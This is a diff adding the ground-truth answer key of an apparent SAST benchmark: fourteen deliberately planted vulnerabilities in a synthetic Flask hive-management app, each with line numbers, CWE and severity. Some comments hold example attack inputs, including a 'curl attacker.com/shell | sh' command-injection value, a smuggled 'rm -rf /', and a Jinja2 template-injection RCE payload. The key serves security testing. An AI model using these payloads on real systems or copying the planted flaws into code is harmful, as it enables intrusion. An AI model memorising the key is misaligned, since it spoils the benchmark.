@@ -1,0 +1,219 @@
+meta:
+  repo: full-audit/benchmark/seeds/synthetic-vuln-01
+  commit: PREREG-PLACEHOLDER
+  notes: >-
+    Original post-cutoff contamination-control seed authored 2026-05.
+    Domain: beekeeping-club hive & harvest management (HiveTrack).
+    All GT items are by-construction-exact: the author planted each
+    vulnerability and recorded the precise sink line(s) before any
+    reviewer or scanner saw the code. Safe/decoy code paths are
+    intentionally present to test precision, not listed here.
+
+items:
+  - id: GT-S01-001
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 30
+    line_end: 30
+    cwe: CWE-798
+    severity: CRITICAL
+    cvss: 9.8
+    comment: >-
+      Hardcoded Flask secret key (app.secret_key = literal string).
+      Anyone reading source can forge session cookies; secret is
+      committed to VCS and never rotated.
+
+  - id: GT-S01-002
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 99
+    line_end: 99
+    cwe: CWE-328
+    severity: HIGH
+    cvss: 7.5
+    comment: >-
+      MD5 used for password hashing (hashlib.md5) with no salt.
+      MD5 is broken for this purpose: trivially reversible via rainbow
+      tables; CWE-328 (Use of Weak Hash) / CWE-916 (Insufficient
+      Password Hash Iterations).
+
+  - id: GT-S01-003
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 166
+    line_end: 167
+    cwe: CWE-89
+    severity: CRITICAL
+    cvss: 9.8
+    comment: >-
+      SQL injection at login: username from request.form concatenated
+      directly into a raw SQL string ("SELECT ... WHERE username = '"
+      + username + "'"). Allows authentication bypass and data
+      exfiltration via classic SQLi payloads.
+
+  - id: GT-S01-004
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 229
+    line_end: 229
+    cwe: CWE-639
+    severity: HIGH
+    cvss: 7.5
+    comment: >-
+      IDOR in view_hive: hive fetched by attacker-supplied hive_id
+      with no ownership check (no WHERE owner_id = current_user).
+      Any authenticated member can read any other member's hive by
+      enumerating integer IDs.
+
+  - id: GT-S01-005
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 249
+    line_end: 251
+    cwe: CWE-89
+    severity: CRITICAL
+    cvss: 9.1
+    comment: >-
+      SQL injection in search_hives: q from request.args inserted via
+      Python %-string formatting into a LIKE query. Allows UNION-based
+      exfiltration of all tables. Contrast with safe parameterized
+      queries used elsewhere (dashboard, harvest, add_note) — this
+      one is the exception.
+
+  - id: GT-S01-006
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 297
+    line_end: 300
+    cwe: CWE-184
+    severity: MEDIUM
+    cvss: 5.3
+    comment: >-
+      Incomplete allowlist in allowed_file(): rsplit on "." takes only
+      the last extension token, so double-extension filenames like
+      "shell.php.pdf" are mis-classified as safe. The function also
+      never strips path-separator characters, allowing "../" traversal
+      to escape UPLOAD_DIR when the filename reaches os.path.join in
+      upload_report. Subtle because the function appears to validate
+      extensions correctly at first glance.
+
+  - id: GT-S01-007
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 312
+    line_end: 313
+    cwe: CWE-22
+    severity: HIGH
+    cvss: 8.1
+    comment: >-
+      Path traversal in upload_report: os.path.join(UPLOAD_DIR,
+      f.filename) uses raw attacker-controlled filename without
+      os.path.basename() or normalization. A filename of
+      "../../app.py" overwrites arbitrary files relative to the
+      upload directory, enabling code execution or config corruption.
+
+  - id: GT-S01-008
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 361
+    line_end: 362
+    cwe: CWE-94
+    severity: CRITICAL
+    cvss: 9.8
+    comment: >-
+      Server-side template injection (SSTI) in profile(): user-supplied
+      bio string is concatenated directly into the template source
+      passed to render_template_string. Jinja2 evaluates embedded
+      expressions; payload {{ ''.__class__.__mro__[1].__subclasses__() }}
+      leads to full RCE.
+
+  - id: GT-S01-009
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 388
+    line_end: 388
+    cwe: CWE-78
+    severity: CRITICAL
+    cvss: 9.8
+    comment: >-
+      OS command injection in export_log: fmt from request.args is
+      concatenated into the string passed to os.system with shell=True
+      (implicit). Payload "csv; curl attacker.com/shell | sh" executes
+      arbitrary commands. Reachable by any admin-role user.
+
+  - id: GT-S01-010
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 406
+    line_end: 406
+    cwe: CWE-918
+    severity: HIGH
+    cvss: 8.6
+    comment: >-
+      SSRF in weather(): location_url from request.args is passed
+      verbatim to requests.get. No URL scheme restriction, no IP
+      allowlist. Allows probing internal services (cloud metadata,
+      Redis, internal APIs) and port scanning.
+
+  - id: GT-S01-011
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 428
+    line_end: 431
+    cwe: CWE-601
+    severity: MEDIUM
+    cvss: 6.1
+    comment: >-
+      Open redirect bypass in is_safe_redirect(): host extracted with
+      split then compared via startswith(safe_domain) instead of
+      equality. "hivetrack.example.com.evil.net" passes the check for
+      safe domain "hivetrack.example.com". Subtle: the code looks
+      correct at first read but the startswith comparison is the flaw.
+
+  - id: GT-S01-012
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 460
+    line_end: 460
+    cwe: CWE-502
+    severity: CRITICAL
+    cvss: 9.8
+    comment: >-
+      Insecure deserialization: pickle.loads(raw) where raw is the raw
+      HTTP request body from an admin user. A crafted pickle payload
+      executes arbitrary Python (and OS) code during deserialization,
+      before any hive-data logic runs.
+
+  - id: GT-S01-013
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 495
+    line_end: 497
+    cwe: CWE-79
+    severity: HIGH
+    cvss: 7.4
+    comment: >-
+      Stored XSS: note_text from request.form is stored verbatim in
+      the hives.notes column and then rendered via the |safe Jinja2
+      filter in HIVE_DETAIL_TMPL (line 617), bypassing auto-escaping.
+      The storage and rendering are in separate code paths, making
+      this a 2-location stored XSS. The ownership authz check on the
+      write side is correct (safe decoy) — the vuln is in the absence
+      of sanitization before storage.
+
+  - id: GT-S01-014
+    type: sast
+    file: benchmark/seeds/synthetic-vuln-01/app.py
+    line_start: 521
+    line_end: 545
+    cwe: CWE-78
+    severity: HIGH
+    cvss: 8.1
+    comment: >-
+      Subtle 2-hop command injection: parse_queen_tag uses re.match
+      (anchors only at start, not end) so "2024-Q001-NZ42; rm -rf /"
+      passes regex validation. The tainted hive_code value then flows
+      into subprocess.run with shell=True at line 544-545. A reviewer
+      must trace the data flow across two functions to see the bug;
+      the regex makes it look validated. CWE-78 (OS command injection)
+      with CWE-20 (Improper Input Validation) as contributing factor.
